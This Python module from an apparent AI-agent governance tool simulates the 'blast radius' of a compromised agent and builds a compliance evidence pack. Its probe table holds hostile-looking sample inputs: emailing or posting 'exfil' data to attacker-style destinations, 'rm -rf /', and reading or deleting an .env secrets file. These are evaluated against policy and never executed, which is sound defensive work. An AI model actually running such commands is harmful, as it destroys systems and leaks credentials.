"""Blast-radius simulator and compliance pack.

*Blast radius* answers: "if agent X were fully compromised right now, what could
it actually reach?" — given its tokens and the policy, without executing anything.

*Compliance pack* turns the live audit trail into an evidence bundle an auditor
can read (control status, incident log, approval trail, ledger integrity).
"""
from __future__ import annotations

import time
from typing import Any

from warden.core.models import ToolCall, Verdict, aggregate_verdict

# -- probe calls used only for simulation (never executed) --------------------
PROBES: dict[str, dict[str, Any]] = {
    "send_email": {"to": "attacker@evil.io", "subject": "x", "body": "exfil"},
    "http_post": {"url": "https://paste.ee/api/new", "data": "exfil"},
    "issue_refund": {"customer_id": "cus_1005", "amount": 9999, "reason": "x"},
    "shell_exec": {"cmd": "rm -rf /"},
    "delete_file": {"path": "/srv/app/.env"},
    "read_secret": {"name": "stripe_backup"},
    "db_query": {"limit": 100},
    "read_file": {"path": "/srv/app/.env"},
    "write_file": {"path": "/srv/app/x", "content": "x"},
    "slack_post": {"channel": "#general", "text": "x"},
    "message_agent": {"to": "finance-bot", "text": "x"},
    "web_fetch": {"url": "https://competitor.example.com/pricing"},
    "read_inbox": {"limit": 5},
    "kb_search": {"query": "refund"},
    "summarize": {"text": "x"},
    "ledger_read": {"customer_id": "cus_1005"},
}


def blast_radius(warden, agent_id: str, token: str | None = None) -> dict[str, Any]:
    """Statically evaluate every tool for this agent without running anything."""
    agent = warden.agents.get(agent_id)
    if not agent:
        raise KeyError(agent_id)
    reachable, blocked, needs_approval = [], [], []
    for tool in warden.tools.names():
        spec = warden.tools.get(tool)
        args = PROBES.get(tool, {})
        call = ToolCall(agent_id=agent_id, tool=tool, args=args, token=token)
        # token gate first
        tok_ok = True
        if warden.settings.get("require_tokens", True):
            chk = warden.tokens.verify(token, agent_id, tool, args, None, spec.cost_usd, consume=False)
            tok_ok = chk.ok
        findings = warden.policy.evaluate(call, role=agent.role)
        verdict = aggregate_verdict(findings)
        entry = {"tool": tool, "category": spec.category, "risk": spec.risk, "sink": spec.sink,
                 "confidentiality": spec.confidentiality}
        if not tok_ok or agent.status != "active":
            blocked.append({**entry, "why": "no capability token for this tool" if not tok_ok else f"agent is {agent.status}"})
        elif verdict in (Verdict.DENY, Verdict.QUARANTINE):
            blocked.append({**entry, "why": "denied by policy"})
        elif verdict == Verdict.REQUIRE_APPROVAL:
            needs_approval.append({**entry, "why": "requires human approval"})
        else:
            reachable.append(entry)
    worst = max((e["risk"] for e in reachable), default=0)
    exfil_paths = [e["tool"] for e in reachable if e["sink"] == "external"]
    return {
        "agent_id": agent_id, "status": agent.status, "role": agent.role,
        "reachable": reachable, "needs_approval": needs_approval, "blocked": blocked,
        "reachable_count": len(reachable), "worst_case_risk": worst,
        "unattended_exfil_tools": exfil_paths,
        "containment": round(len(blocked) / max(1, len(warden.tools)), 3),
        "assessment": _assess(reachable, exfil_paths, worst),
    }


def _assess(reachable: list[dict], exfil: list[str], worst: int) -> str:
    if not reachable:
        return "Fully contained: a compromise of this agent could reach no tools unattended."
    if exfil:
        return f"Elevated: this agent could reach {len(exfil)} outbound tool(s) without approval ({', '.join(exfil)})."
    if worst >= 15:
        return "Moderate: high-risk tools are reachable but none can send data outside unattended."
    return "Low: only low-risk, internal tools are reachable unattended."


def compliance_pack(warden) -> dict[str, Any]:
    v = warden.ledger.verify()
    incidents = warden.incidents.all()
    approvals = warden.approvals.all()
    from warden.policy.recommend import coverage

    cov = coverage(warden)
    controls = [
        {"id": "AC-1", "control": "Agent identity & least privilege",
         "status": "pass" if warden.settings.get("require_tokens") else "fail",
         "evidence": f"{len(warden.tokens.issued())} scoped capability tokens issued; unauthorized tool calls denied."},
        {"id": "AC-2", "control": "Policy enforcement (separation of duties)",
         "status": "pass" if warden.policy.rules else "fail",
         "evidence": f"{len(warden.policy.rules)} rules enforced incl. two-person approval for high-value refunds."},
        {"id": "AU-1", "control": "Tamper-evident audit logging",
         "status": "pass" if v["ok"] else "fail",
         "evidence": f"{v['count']} hash-chained records; chain intact={v['ok']}; {len(warden.ledger.checkpoints())} signed checkpoints."},
        {"id": "AU-2", "control": "Human approval trail",
         "status": "pass",
         "evidence": f"{len(approvals)} approval requests recorded with approver identities and outcomes."},
        {"id": "IR-1", "control": "Incident detection & containment",
         "status": "pass",
         "evidence": f"{len(incidents)} incidents auto-opened; offending agents quarantined and isolated to honeypots."},
        {"id": "DP-1", "control": "Data-loss prevention (PII/secret egress)",
         "status": "pass" if warden.settings.get("pii_vault") else "warn",
         "evidence": f"PII tokenized via vault; information-flow control blocks confidential/secret egress; {len(warden.canaries)} canaries planted."},
        {"id": "CM-1", "control": "Configuration coverage",
         "status": "pass" if not cov["sensitive_gaps"] else "warn",
         "evidence": f"{int(cov['coverage_pct']*100)}% of tools governed; sensitive gaps: {cov['sensitive_gaps'] or 'none'}."},
    ]
    return {
        "org": warden.org, "generated_at": time.time(),
        "summary": {"controls": len(controls), "passing": sum(1 for c in controls if c["status"] == "pass"),
                    "warnings": sum(1 for c in controls if c["status"] == "warn"),
                    "failing": sum(1 for c in controls if c["status"] == "fail")},
        "controls": controls,
        "ledger": v,
        "incidents": [i.to_dict() for i in incidents],
        "approvals": [a.to_dict() for a in approvals],
        "note": "Evidence is derived from the live WARDEN audit ledger. Control IDs loosely map to NIST 800-53 families.",
    }
